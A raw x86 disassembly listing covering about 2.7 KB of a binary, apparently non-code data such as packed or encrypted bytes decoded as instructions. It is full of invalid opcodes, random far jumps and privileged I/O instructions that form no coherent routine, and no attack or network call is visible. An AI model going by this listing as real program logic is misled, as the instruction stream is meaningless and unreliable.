  423243:	das    
  423244:	pushf  
  423245:	ja     0x423248
  423247:	add    dh,dh
  423249:	add    BYTE PTR [eax],al
  42324b:	add    dh,bl
  42324d:	jne    0x42321a
  42324f:	mov    al,0x41
  423251:	mov    ch,0x60
  423253:	lods   al,BYTE PTR ds:[esi]
  423254:	xor    DWORD PTR [edx],ecx
  423256:	adc    BYTE PTR [eax+0x31db16f4],0xba
  42325d:	push   ecx
  42325e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42325f:	push   cs
  423260:	pusha  
  423261:	push   ebx
  423262:	mov    eax,0x6505f421
  423267:	(bad)  
  423268:	loope  0x4232ce
  42326a:	ins    DWORD PTR es:[edi],dx
  42326b:	xor    esi,edx
  42326d:	pop    eax
  42326e:	call   0x23760919
  423273:	out    0xfa,al
  423275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423276:	xchg   edi,eax
  423277:	xor    al,0xb
  423279:	dec    ebx
  42327a:	out    dx,eax
  42327b:	push   ss
  42327c:	xor    BYTE PTR [esi],dl
  42327e:	push   0xbb286874
  423283:	out    0x7d,al
  423285:	mov    gs,WORD PTR [edx*1-0x2e0781c4]
  42328c:	mov    eax,ds:0xa756f5f9
  423291:	sbb    al,0x65
  423293:	sar    ah,cl
  423295:	mov    ebx,0x7c9d207c
  42329a:	dec    edx
  42329b:	push   ebp
  42329c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42329d:	xor    cl,BYTE PTR [ecx]
  42329f:	je     0x4232c0
  4232a1:	jle    0x423300
  4232a3:	push   esp
  4232a4:	sbb    al,0xbb
  4232a6:	dec    ecx
  4232a7:	xor    cl,BYTE PTR [edx]
  4232a9:	ins    DWORD PTR es:[edi],dx
  4232aa:	out    0x43,al
  4232ac:	div    DWORD PTR [eax+0x2c]
  4232af:	xor    cl,al
  4232b1:	pop    edx
  4232b2:	jge    0x423319
  4232b4:	fbstp  TBYTE PTR [esi]
  4232b6:	aam    0xf2
  4232b8:	loop   0x423314
  4232ba:	push   edx
  4232bb:	fistp  DWORD PTR gs:[ecx]
  4232be:	rol    dl,cl
  4232c0:	fdivr  DWORD PTR [ebp+0x46512e16]
  4232c6:	leave  
  4232c7:	and    ch,BYTE PTR [edx-0x62f491cb]
  4232cd:	int    0xc9
  4232cf:	dec    ecx
  4232d0:	aad    0x84
  4232d2:	add    ah,BYTE PTR [ecx]
  4232d4:	in     eax,0x3d
  4232d6:	push   cs
  4232d7:	aas    
  4232d8:	mov    cs,WORD PTR [esi-0x5b]
  4232db:	cmp    eax,0x7ecbe193
  4232e0:	loope  0x4232e6
  4232e2:	jmp    0xd29c:0xf360b100
  4232e9:	cdq    
  4232ea:	sub    eax,0x39ad86a2
  4232ef:	popf   
  4232f0:	call   0x33ef:0xa7e5ea3b
  4232f7:	xchg   edx,eax
  4232f8:	pushf  
  4232f9:	mov    edi,DWORD PTR [ecx]
  4232fb:	arpl   WORD PTR [ebx],ax
  4232fd:	retf   
  4232fe:	out    dx,al
  4232ff:	fcmovnbe st,st(0)
  423301:	fld    DWORD PTR [edi+0x167c6e8f]
  423307:	test   bl,cl
  423309:	jecxz  0x4232f2
  42330b:	fld    QWORD PTR [eax+0x3146a568]
  423311:	xor    al,0xb1
  423313:	jmp    FWORD PTR [ebp-0x36]
  423316:	dec    eax
  423317:	mov    BYTE PTR [esi+0x67577814],dh
  42331d:	dec    ebp
  42331e:	add    al,0xc9
  423320:	fidivr WORD PTR [edi]
  423322:	inc    ecx
  423323:	cs pop esi
  423325:	lea    esi,[ebx+0x34c779ec]
  42332b:	ja     0x4232b9
  42332d:	retf   
  42332e:	(bad)  
  42332f:	mov    WORD PTR [ecx],?
  423331:	icebp  
  423332:	repnz pop ss
  423334:	and    ebp,eax
  423336:	mov    BYTE PTR [esp+esi*2-0x21],ch
  42333a:	je     0x42337a
  42333c:	pop    ebx
  42333d:	sbb    ch,ah
  42333f:	mov    al,ds:0xfda9
	...
  4233b4:	push   edx
  4233b5:	sub    BYTE PTR [esi],0x69
  4233b8:	(bad)  
  4233b9:	in     eax,dx
  4233ba:	push   edi
  4233bb:	mov    ebx,0x8e4aa104
  4233c0:	sub    BYTE PTR [ecx],bl
  4233c2:	popa   
  4233c3:	dec    ecx
  4233c4:	xchg   edx,eax
  4233c5:	js     0x4233c8
  4233c7:	add    dh,dh
  4233c9:	add    BYTE PTR [eax],al
  4233cb:	add    ah,ch
  4233cd:	xchg   edx,eax
  4233ce:	je     0x423361
  4233d0:	jne    0x42342c
  4233d2:	mov    ds:0x878fd959,al
  4233d7:	mov    ah,0x4a
  4233d9:	dec    esp
  4233da:	scas   eax,DWORD PTR es:[edi]
  4233db:	jp     0x4233a9
  4233dd:	fwait
  4233de:	sub    al,0xcb
  4233e0:	push   esi
  4233e1:	iret   
  4233e2:	push   edi
  4233e3:	xchg   ecx,eax
  4233e4:	pop    eax
  4233e5:	icebp  
  4233e6:	cmp    al,0xc7
  4233e8:	mov    DWORD PTR [ebp-0xf0644dc],ecx
  4233ee:	dec    ebp
  4233ef:	loopne 0x4233cd
  4233f1:	inc    esi
  4233f2:	push   edi
  4233f3:	and    dh,BYTE PTR [esi+0x0]
  4233f6:	mov    bl,0x1
  4233f8:	or     edx,DWORD PTR [edi+ebp*4]
  4233fb:	cmp    eax,0x33934130
  423400:	out    dx,eax
  423401:	push   ebx
  423402:	arpl   WORD PTR [ecx],ax
  423404:	in     eax,0xf5
  423406:	xchg   BYTE PTR cs:[edi+ebx*4-0x21],ah
  42340b:	jae    0x4233bb
  42340d:	adc    edx,DWORD PTR [ebp-0x777db7b6]
  423413:	sbb    al,BYTE PTR [edi]
  423415:	fistp  DWORD PTR [edi+0x474f930e]
  42341b:	push   esp
  42341c:	push   edx
  42341d:	scas   al,BYTE PTR es:[edi]
  42341e:	sti    
  42341f:	fisttp DWORD PTR [eax+0x7d]
  423422:	adc    ebp,eax
  423424:	cli    
  423425:	lahf   
  423426:	xchg   ebp,eax
  423427:	hlt    
  423428:	sbb    edx,edi
  42342a:	das    
  42342b:	add    ecx,esi
  42342d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42342e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42342f:	daa    
  423430:	sub    DWORD PTR [esi],esi
  423432:	(bad)  [esi+esi*8-0x6abbc5ff]
  423439:	xchg   esp,ecx
  42343b:	mov    ah,0xb6
  42343d:	adc    BYTE PTR [ebx+ebx*2+0x13c973b],cl
  423444:	addr16 mov ch,0x54
  423447:	push   ebp
  423448:	adc    BYTE PTR [eax+edx*8+0x120ad89f],ch
  42344f:	mov    eax,ecx
  423451:	fild   DWORD PTR [ebp-0x62]
  423454:	in     eax,0xfa
  423456:	cdq    
  423457:	clc    
  423458:	cwde   
  423459:	xor    eax,0x29c2250c
  42345e:	adc    ebx,ebx
  423460:	ret    
  423461:	push   ss
  423462:	adc    BYTE PTR [ebx+ebx*1-0x5f09b44c],0x32
  42346a:	imul   eax,ebp,0xffffffe7
  42346d:	daa    
  42346e:	adc    DWORD PTR [ebx+0x8],edx
  423471:	dec    ecx
  423472:	int    0xa6
  423474:	sahf   
  423475:	lock jne 0x4234d6
  423478:	sbb    BYTE PTR [ebx-0x5f],bl
  42347b:	(bad)  
  42347c:	(bad)  
  42347d:	das    
  42347e:	in     eax,0xb6
  423480:	mov    esi,es
  423482:	or     dh,dh
  423484:	call   0x10a4:0xbf443f17
  42348b:	repnz push esi
  42348d:	loop   0x423434
  42348f:	pop    eax
  423490:	test   DWORD PTR [ecx-0x45],0x74947e3d
  423497:	icebp  
  423498:	aad    0xd1
  42349a:	jo     0x4234d9
  42349c:	js     0x4234aa
  42349e:	xchg   cl,bl
  4234a0:	add    DWORD PTR ds:0xb0b003a1,esi
  4234a6:	mov    ds:0xb7a6e04f,al
  4234ab:	pop    ss
  4234ac:	pop    ebp
  4234ad:	cmp    dl,0xfb
  4234b0:	mov    bl,0x40
  4234b2:	adc    ebx,DWORD PTR [ecx-0x3a]
  4234b5:	daa    
  4234b6:	test   BYTE PTR [ebx],dl
  4234b8:	aad    0x5
  4234ba:	out    0x2e,eax
  4234bc:	push   ebx
  4234bd:	fwait
  4234be:	or     ah,BYTE PTR ss:[esi+0x26]
	...
  423531:	add    BYTE PTR [eax],al
  423533:	add    BYTE PTR [edx-0x40887052],bl
  423539:	ja     0x423535
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0x8
  423541:	scas   al,BYTE PTR es:[edi]
  423542:	jl     0x42354b
  423544:	mov    BYTE PTR [ecx+0x1],bh
  423547:	add    dh,dh
  423549:	add    BYTE PTR [eax],al
  42354b:	add    BYTE PTR [eax+eax*8],bl
  42354e:	sti    
  42354f:	xchg   ebx,eax
  423550:	jge    0x423529
  423552:	out    0xc0,al
  423554:	pop    ebp
  423555:	sub    bh,al
  423557:	and    eax,0xdbd7c9c1
  42355c:	in     al,0x82
  42355e:	add    al,0x47
  423560:	xchg   ebx,eax
  423561:	mov    dh,0x17
  423563:	xchg   esi,eax
  423564:	cs cmp al,0x93
  423567:	and    ch,BYTE PTR [esi+0x70]
  42356a:	aas    
  42356b:	ins    BYTE PTR es:[edi],dx
  42356c:	xchg   ebx,eax
  42356d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42356e:	jo     0x423521
  423570:	(bad)  
  423571:	or     ebp,DWORD PTR [bp+si-0x6350]
  423576:	xor    al,0x11
  423578:	adc    al,0x7
  42357a:	add    dh,BYTE PTR [esp+edi*2-0x1448f31e]
  423581:	out    0x4a,al
  423583:	push   cs
  423584:	fwait
  423585:	into   
  423586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423587:	in     al,0x5b
  423589:	je     0x42354d
  42358b:	ret    
  42358c:	fcomp  DWORD PTR [ebx-0x16d1ea2]
  423592:	jne    0x42359a
  423594:	cmp    dh,dh
  423596:	imul   eax,DWORD PTR [esi+0x21e28cbe],0x548d9165
  4235a0:	sar    DWORD PTR [ebp+0x7b9ae213],cl
  4235a6:	jne    0x4235e4
  4235a8:	jle    0x4235bc
  4235aa:	xor    DWORD PTR [ebx-0x14],0xbd80009a
  4235b1:	addr16 jae 0x4235ca
  4235b4:	inc    ebp
  4235b5:	daa    
  4235b6:	dec    edi
  4235b7:	aam    0x6e
  4235b9:	sahf   
  4235ba:	or     edi,DWORD PTR [ebx]
  4235bc:	adc    al,0xbf
  4235be:	cli    
  4235bf:	push   ecx
  4235c0:	fucomip st,st(4)
  4235c2:	jle    0x4235af
  4235c4:	add    ebx,DWORD PTR [eax+eiz*4+0x4c]
  4235c8:	shr    cl,1
  4235ca:	or     al,0xc
  4235cc:	scas   al,BYTE PTR es:[edi]
  4235cd:	adc    eax,0x6385797
  4235d2:	cmp    ch,al
  4235d4:	fldcw  WORD PTR [eax+0x79f0dcd1]
  4235da:	cmc    
  4235db:	fwait
  4235dc:	mov    edx,0x1e7212b7
  4235e1:	mov    bl,BYTE PTR [eax]
  4235e3:	(bad)  
  4235e4:	push   ebx
  4235e5:	mov    edi,0xe0e9c224
  4235ea:	and    BYTE PTR [esi+0x598cbbe9],bl
  4235f0:	fiadd  WORD PTR [edi+0x6dc56578]
  4235f6:	jo     0x42366b
  4235f8:	sar    bl,cl
  4235fa:	mov    ebp,0x67692c17
  4235ff:	and    al,dl
  423601:	mov    esp,0x8e9acf8e
  423606:	arpl   WORD PTR [eax],ax
  423608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423609:	pop    ss
  42360a:	inc    edx
  42360b:	sbb    al,0x10
  42360d:	out    0x4b,eax
  42360f:	in     eax,0x71
  423611:	cmp    DWORD PTR [ecx+0x5cd135f1],0x3e
  423618:	jecxz  0x4235d8
  42361a:	call   0xcca3f0b3
  42361f:	retf   
  423620:	pop    eax
  423621:	ficomp WORD PTR [ebp-0x34b2c163]
  423627:	fwait
  423628:	call   0x30a38804
  42362d:	cdq    
  42362e:	stos   DWORD PTR es:[edi],eax
  42362f:	xlat   BYTE PTR ds:[ebx]
  423630:	scas   al,BYTE PTR es:[edi]
  423631:	les    esi,FWORD PTR [ebx]
  423633:	es pop ss
  423635:	mov    esi,0x939577d0
  42363a:	push   ebx
  42363b:	ss xchg ebx,eax
  42363d:	cmp    BYTE PTR [ebp+eax*2+0xb9f1],cl
	...
  4236b4:	daa    
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm0,QWORD PTR [esp+edx*1+0x50]
  4236c3:	stos   BYTE PTR es:[edi],al
  4236c4:	jle    0x423740
  4236c6:	add    DWORD PTR [eax],eax
  4236c8:	test   BYTE PTR [eax],0x0
  4236cb:	add    BYTE PTR [esi+0x4a],cl
  4236ce:	adc    esi,ebx
  4236d0:	add    DWORD PTR [ecx+0x70],esp
  4236d3:	xchg   edi,ebx
  4236d5:	pop    esp
  4236d6:	pop    eax
  4236d7:	mov    al,0xb
  4236d9:	mov    ds:0x18b0e669,al
  4236de:	rcl    DWORD PTR [ebp+ebp*4-0x59],0x99
  4236e3:	sbb    esi,DWORD PTR [bp+0x4de1]
  4236e8:	out    dx,eax
  4236e9:	dec    esp
  4236ea:	pop    ss
  4236eb:	mov    DWORD PTR [ebx+0x4e1126fb],ebp
  4236f1:	aaa    
  4236f2:	cmc    
  4236f3:	je     0x423767
  4236f5:	aad    0x3c
  4236f7:	inc    edx
  4236f8:	jmp    0x4d2d:0xeacf612d
  4236ff:	jns    0x4236e8
  423701:	jnp    0x423755
  423703:	cwde   
  423704:	push   eax
  423705:	adc    eax,DWORD PTR [esi+edx*4]
  423708:	add    ah,BYTE PTR [eax-0x39f2ba4]
  42370e:	adc    al,0xd9
  423710:	pop    edx
  423711:	inc    esi
  423712:	xchg   esp,eax
  423713:	(bad)  
  423714:	push   ecx
  423715:	test   BYTE PTR [eax],dh
  423717:	inc    edi
  423718:	add    BYTE PTR [ebx+0x20e8b0ba],0xb7
  42371f:	call   0x290c:0x92d7f72e
  423726:	mov    ?,WORD PTR [ecx-0x50d26955]
  42372c:	pop    ebp
  42372d:	(bad)  
  42372e:	fdivr  st(7),st
  423730:	mov    bl,0x3d
  423732:	sub    eax,ebx
  423734:	mov    BYTE PTR [ecx],dl
  423736:	fstp   TBYTE PTR [ebx-0x5f09b101]
  42373c:	sub    eax,eax
  42373e:	dec    esi
  42373f:	in     eax,0x17
  423741:	ds xchg esi,eax
  423743:	dec    edx
  423744:	cmp    DWORD PTR [ebx+eiz*4],ebx
  423747:	or     al,0x4
  423749:	jle    0x423780
  42374b:	xor    bh,BYTE PTR [ecx-0x70b6a67f]
  423751:	rol    BYTE PTR [edi+0x2b6fd717],1
  423757:	mov    bl,0xc6
  423759:	sub    DWORD PTR [esi+ebx*4],eax
  42375c:	inc    edi
  42375d:	push   edi
  42375e:	xchg   esp,eax
  42375f:	xor    BYTE PTR [edx+0x64],ah
  423762:	sbb    eax,0x183c159c
  423767:	fs ret 
  423769:	outs   dx,DWORD PTR ds:[esi]
  42376a:	xor    ebx,eax
  42376c:	aam    0xe0
  42376e:	fmul   QWORD PTR [ebx-0x47]
  423771:	retf   
  423772:	mul    DWORD PTR [ebx+0x3621dd]
  423778:	(bad)  
  423779:	arpl   si,sp
  42377b:	jl     0x423778
  42377d:	pop    esp
  42377e:	clc    
  42377f:	and    bl,BYTE PTR [edx]
  423781:	retf   
  423782:	out    0x6a,al
  423784:	aas    
  423785:	fld    QWORD PTR [ecx-0x10]
  423788:	dec    ebp
  423789:	sub    DWORD PTR [ebx+0x28],esp
  42378c:	dec    esi
  42378d:	mov    ah,ch
  42378f:	shr    BYTE PTR [ecx],0x5b
  423792:	(bad)  
  423793:	mov    eax,ds:0x69728348
  423798:	out    dx,al
  423799:	push   esp
  42379a:	dec    esi
  42379b:	mov    bl,0x91
  42379d:	xchg   ebx,eax
  42379e:	cli    
  42379f:	mov    cl,0xdc
  4237a1:	pop    ebx
  4237a2:	mov    BYTE PTR [ecx-0x44],dh
  4237a5:	(bad)  [edi+0x3f2405df]
  4237ab:	fsub   QWORD PTR [ebp+0x8]
  4237ae:	add    eax,0x6944ca81
  4237b3:	or     al,0xce
  4237b5:	push   0x27
  4237b7:	mov    eax,ds:0x8f417b73
  4237bc:	in     al,0x24
  4237be:	adc    ch,BYTE PTR [si+0xb7]
	...
  423833:	add    ch,cl
  423835:	cmp    DWORD PTR [eax-0x10680369],edi
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	mov    cl,0xbf
  423842:	jecxz  0x4237e6
  423844:	je     0x4238c1
  423846:	add    DWORD PTR [eax],eax
  423848:	test   BYTE PTR [eax],0x0
  42384b:	add    BYTE PTR [esi+0x69],ah
  42384e:	pusha  
  42384f:	mov    WORD PTR [esi+0x2],?
  423852:	mov    ds:0xe56ed5f0,eax
  423857:	das    
  423858:	retf   
  423859:	je     0x423889
  42385b:	shl    BYTE PTR [esi],1
  42385d:	push   ds
  42385e:	inc    esi
  42385f:	js     0x4238b3
  423861:	add    cl,ch
  423863:	or     eax,0x350d717d
  423868:	pop    ds
  423869:	stc    
  42386a:	jmp    0xfb98:0x7bcc4bac
  423871:	pop    ds
  423872:	stc    
  423873:	cs (bad) 
  423876:	jge    0x42384a
  423878:	add    eax,0x80e5d774
  42387d:	pop    es
  42387e:	icebp  
  42387f:	into   
  423880:	jb     0x423885
  423882:	jns    0x42383f
  423884:	(bad)  
  423885:	(bad)
  423888:	nop
  423889:	ja     0x423849
  42388b:	pop    ds
  42388c:	cmp    al,0x64
  42388e:	fdivrp st(3),st
  423890:	gs nop
  423892:	retf   
  423893:	dec    ecx
  423894:	imul   edx,DWORD PTR [ebx+0x3b],0xffffffaf
  423898:	jnp    0x42387f
  42389a:	idiv   DWORD PTR [ebx]
  42389c:	(bad)  [edx-0x74]
  42389f:	retf   
  4238a0:	call   0x1be1:0x83bc0d07
  4238a7:	xchg   esp,eax
  4238a8:	pusha  
  4238a9:	dec    esi
  4238aa:	mov    edi,ebx
  4238ac:	cdq    
  4238ad:	in     eax,dx
  4238ae:	inc    ebp
  4238af:	(bad)  [ebp+0x5a]
  4238b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238b3:	orps   xmm4,XMMWORD PTR [ebx]
  4238b6:	sub    al,0xcd
  4238b8:	ret    0x82fd
  4238bb:	aas    
  4238bc:	or     al,BYTE PTR [esi+0x73]
  4238bf:	sbb    cl,BYTE PTR [edx-0x7393e918]
  4238c5:	mov    ch,0x99
  4238c7:	loopne 0x423917
  4238c9:	pop    ecx
  4238ca:	mov    edi,0x132e0288
  4238cf:	sub    DWORD PTR ds:0xf65d10d7,esi
  4238d5:	lods   eax,DWORD PTR ds:[esi]
  4238d6:	sub    DWORD PTR [edi],ecx
  4238d8:	mov    ds:0x5c202c10,eax
  4238dd:	xchg   esi,eax
  4238de:	pmulhuw mm5,QWORD PTR [ebx]
  4238e1:	jecxz  0x423887
  4238e3:	sub    esi,DWORD PTR [esi]
  4238e5:	nop
  4238e6:	out    dx,eax
  4238e7:	inc    esp
  4238e8:	mov    esi,0x50904d6f
  4238ed:	push   ss
  4238ee:	jp     0x4238c8
  4238f0:	add    eax,0x776219e0
  4238f5:	stc    
  4238f6:	push   es
  4238f7:	xchg   ebp,eax
  4238f8:	in     al,dx
  4238f9:	(bad)  
  4238fa:	and    bh,0x2e
  4238fd:	mov    bh,0xe1
  4238ff:	pop    esi
  423900:	retf   0x59e9
  423903:	icebp  
  423904:	aam    0xb0
  423906:	fsubr  st,st(0)
  423908:	cmp    al,0xa0
  42390a:	rol    ebp,1
  42390c:	pop    ss
  42390d:	add    BYTE PTR [esi],al
  42390f:	int3   
  423910:	fwait
  423911:	push   ecx
  423912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423913:	aad    0x6c
  423915:	dec    edx
  423916:	or     al,0x38
  423918:	or     eax,0xd966a3ef
  42391d:	popf   
  42391e:	mul    DWORD PTR [edi]
  423920:	push   eax
  423921:	dec    edx
  423922:	in     al,0xf4
  423924:	inc    ebx
  423925:	add    ch,BYTE PTR [esp+esi*4+0x12]
  423929:	xchg   esp,eax
  42392a:	jl     0x4238e2
  42392c:	pop    ds
  42392d:	fmul   DWORD PTR [edi]
  42392f:	scas   eax,DWORD PTR es:[edi]
  423930:	or     BYTE PTR [ebp+0x7b],bh
  423933:	cmp    al,0x47
  423935:	add    al,0x63
  423937:	push   ds
  423938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423939:	sar    BYTE PTR [ecx-0x54d5a99c],cl
  42393f:	jecxz  0x4238f2
  423941:	sub    eax,DWORD PTR [eax]
	...
  4239b3:	add    BYTE PTR [esi-0x377e796],dl
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    WORD PTR [eax+0x6a808246],es
  4239c5:	jl     0x4239c8
  4239c7:	add    dh,dh
  4239c9:	add    BYTE PTR [eax],al
  4239cb:	add    BYTE PTR [eax],bl
  4239cd:	out    0xd8,eax
  4239cf:	dec    ebp
  4239d0:	push   edi
  4239d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239d2:	jb     0x4239e6
  4239d4:	or     DWORD PTR [edi+0x6f6953c0],esi
  4239da:	leave  
  4239db:	adc    bl,cl
  4239dd:	aaa    
  4239de:	mov    ecx,0xcaed1739
  4239e3:	dec    esp
  4239e4:	fimul  DWORD PTR [ebp-0x1b]
  4239e7:	dec    edx
  4239e8:	fdivr  DWORD PTR [ebp+eiz*1-0x575391aa]
  4239ef:	std    
  4239f0:	adc    bh,BYTE PTR [ebx]
  4239f2:	jmp    0x4239cd
  4239f4:	sub    al,0x30
  4239f6:	pop    ebp
  4239f7:	or     BYTE PTR [ebx],dh
  4239f9:	leave  
  4239fa:	je     0x4239ae
  4239fc:	xchg   edx,eax
  4239fd:	pushf  
  4239fe:	sub    al,0x92
  423a00:	sahf   
  423a01:	jae    0x4239d3
  423a03:	nop
  423a04:	fdiv   QWORD PTR [edi-0x402870dd]
  423a0a:	in     al,dx
  423a0b:	in     al,dx
  423a0c:	fst    DWORD PTR [edx]
  423a0e:	cdq    
  423a0f:	adc    DWORD PTR [edi],eax
  423a11:	neg    bh
  423a13:	inc    edi
  423a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a15:	and    bh,BYTE PTR [ecx]
  423a17:	js     0x423a6e
  423a19:	bound  ebx,QWORD PTR [eax+0x5e4e54d6]
  423a1f:	jge    0x4239d7
  423a21:	or     eax,0xf1fa3725
  423a26:	test   ecx,eax
  423a28:	and    ebp,esp
  423a2a:	mov    dh,0x6b
  423a2c:	add    BYTE PTR [eax+0x2c],dl
  423a2f:	int3   
  423a30:	jae    0x423a3a
  423a32:	and    dh,BYTE PTR [ecx-0x18f2cea2]
  423a38:	and    bl,al
  423a3a:	mov    DWORD PTR [ebp+0x66c63451],esp
  423a40:	inc    edi
  423a41:	xchg   DWORD PTR [esi-0x55],eax
  423a44:	test   al,dl
  423a46:	cwde   
  423a47:	sub    DWORD PTR [ebx],edx
  423a49:	or     eax,0xd494b21a
  423a4e:	mov    eax,ds:0x1cfa72f1
  423a53:	pop    ss
  423a54:	lods   al,BYTE PTR ds:[esi]
  423a55:	fisubr WORD PTR [edx+0x1d]
  423a58:	fwait
  423a59:	cmp    DWORD PTR [eax],0xb52987f2
  423a5f:	jle    0x423aac
  423a61:	je     0x423a20
  423a63:	icebp  
  423a64:	mov    cl,BYTE PTR [ecx]
  423a66:	dec    ecx
  423a67:	test   eax,0x77d5cac5
  423a6c:	jne    0x423aad
  423a6e:	jbe    0x423a00
  423a70:	sahf   
  423a71:	push   0x7b
  423a73:	mov    ebp,0xac0b87a1
  423a78:	push   DWORD PTR [ebp+0x54027905]
  423a7e:	jmp    FWORD PTR [edi-0x610fdf15]
  423a84:	pop    ss
  423a85:	dec    eax
  423a86:	mov    al,0x9c
  423a88:	pop    ebp
  423a89:	je     0x423a50
  423a8b:	jae    0x423a72
  423a8d:	neg    BYTE PTR [eax-0x4b]
  423a90:	mov    edi,0x45cae0e4
  423a95:	shl    DWORD PTR [eax],0xe
  423a98:	jae    0x423abf
  423a9a:	imul   edi,edx,0x6a
  423a9d:	or     edx,DWORD PTR [esi-0x47]
  423aa0:	pavgusb mm7,QWORD PTR [ecx-0x6b46bbc4]
  423aa8:	dec    ebp
  423aa9:	sbb    al,0xca
  423aab:	call   0x6e9:0x221cdd8f
  423ab2:	arpl   WORD PTR ds:0x8d206fcc,bx
  423ab8:	and    BYTE PTR [eax],bl
  423aba:	cmc    
  423abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423abc:	jns    0x423a49
  423abe:	std    
  423abf:	add    edi,esp
  423ac1:	push   esi
	...
  423b32:	add    BYTE PTR [eax],al
  423b34:	inc    esp
  423b35:	aaa    
  423b36:	dec    edx
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0x15
  423b41:	xchg   DWORD PTR [esi],ebx
  423b43:	dec    esi
  423b44:	pusha  
  423b45:	jge    0x423b48
  423b47:	add    dh,dh
  423b49:	add    BYTE PTR [eax],al
  423b4b:	add    BYTE PTR [edx],dl
  423b4d:	outs   dx,BYTE PTR ds:[esi]
  423b4e:	mov    ?,esp
  423b50:	pushf  
  423b51:	dec    ebx
  423b52:	push   ds
  423b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b54:	xchg   ebp,eax
  423b55:	enter  0x33fa,0x50
  423b59:	fwait
  423b5a:	(bad)  
  423b5b:	test   eax,0x4334e1b2
  423b61:	xchg   BYTE PTR [di],cl
  423b64:	out    0x29,eax
  423b66:	mov    ecx,ecx
  423b68:	aam    0xfa
  423b6a:	repnz push esi
  423b6c:	stc    
  423b6d:	add    eax,0xc4fcfce5
  423b72:	push   edi
  423b73:	push   edi
  423b74:	push   esi
  423b75:	mov    fs,WORD PTR [ecx+0x53]
  423b78:	das    
  423b79:	xchg   esp,eax
  423b7a:	leave  
  423b7b:	or     bl,BYTE PTR [esi]
  423b7d:	outs   dx,BYTE PTR ds:[esi]
  423b7e:	nop
  423b7f:	out    0xb5,eax
  423b81:	ret    
  423b82:	mov    BYTE PTR [edx+0x28],ah
  423b85:	push   esi
  423b86:	pushf  
  423b87:	or     eax,0x14fcd222
  423b8c:	out    dx,al
  423b8d:	retf   0x758d
  423b90:	push   ebx
  423b91:	mov    ch,0xe7
  423b93:	jp     0x423b7f
  423b95:	xchg   ebx,eax
  423b96:	sub    eax,0xad392004
  423b9b:	imul   eax,DWORD PTR [esi-0x7f31762c],0xa3afa2ff
  423ba5:	repnz sbb BYTE PTR [ebx],al
  423ba8:	push   ebp
  423ba9:	pop    es
  423baa:	mov    BYTE PTR [ecx-0x603e48a4],0x32
  423bb1:	lahf   
  423bb2:	data16 shr BYTE PTR [edi],cl
  423bb5:	ffreep st(7)
  423bb7:	push   ebp
  423bb8:	stos   DWORD PTR es:[edi],eax
  423bb9:	fcomp  QWORD PTR [eax]
  423bbb:	sar    BYTE PTR [esi],0x5e
  423bbe:	aad    0x37
  423bc0:	call   0xfe2eae43
  423bc5:	xchg   ecx,eax
  423bc6:	and    esi,DWORD PTR [eax]
  423bc8:	xlat   BYTE PTR ds:[ebx]
  423bc9:	add    esp,DWORD PTR [esi]
  423bcb:	pop    esp
  423bcc:	gs mov al,0xdc
  423bcf:	imul   edx,DWORD PTR [ecx-0x53cd210c],0xffffffed
  423bd6:	test   BYTE PTR [esi-0x7d],al
  423bd9:	jmp    0x804ab55b
  423bde:	fs or  al,0xb0
  423be1:	rol    DWORD PTR [edi-0x19],1
  423be4:	mov    bl,0x64
  423be6:	cmp    al,0x21
  423be8:	cmp    DWORD PTR [ebp+ecx*8-0x1a],0xffffff8a
  423bed:	inc    eax
  423bee:	fnstsw WORD PTR [edi+0x20]
  423bf1:	scas   eax,DWORD PTR es:[edi]
  423bf2:	and    DWORD PTR [ecx-0x5b],0x3d
  423bf6:	sbb    eax,0x1561d135
  423bfb:	dec    esp
  423bfc:	xor    bl,BYTE PTR [ebx+0x7a3b31af]
  423c02:	data16 ficomp WORD PTR [ebx-0x7f20e330]
  423c09:	push   es
  423c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c0b:	mov    es,WORD PTR [eax]
  423c0d:	mov    ds:0xce09ed6b,al
  423c12:	nop
  423c13:	cwde   
  423c14:	ficom  DWORD PTR [ebp-0x4602b693]
  423c1a:	scas   eax,DWORD PTR es:[edi]
  423c1b:	dec    edx
  423c1c:	and    al,0x93
  423c1e:	mul    BYTE PTR [ecx+ecx*8+0x6f]
  423c22:	lods   al,BYTE PTR ds:[esi]
  423c23:	into   
  423c24:	add    BYTE PTR [ebp+edi*8-0x61aa1348],ch
  423c2b:	out    dx,al
  423c2c:	loope  0x423c73
  423c2e:	jne    0x423bdc
  423c30:	jl     0x423be8
  423c32:	mov    eax,ds
  423c34:	bnd jno 0x423c6f
  423c37:	retf   
  423c38:	(bad)  
  423c39:	das    
  423c3a:	jl     0x423c3b
  423c3c:	push   0x21c45bb7
  423c41:	inc    edi
	...
  423cb2:	add    BYTE PTR [eax],al
  423cb4:	mov    edi,0x626d60bd
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0xcd88,0xc
  423cc3:	out    0x56,eax
  423cc5:	jle    0x423cc8
  423cc7:	add    dh,dh
  423cc9:	add    BYTE PTR [eax],al
